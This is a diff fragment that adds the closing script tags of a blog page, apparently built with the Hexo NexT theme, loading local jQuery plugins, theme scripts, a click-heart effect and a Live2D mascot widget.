+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
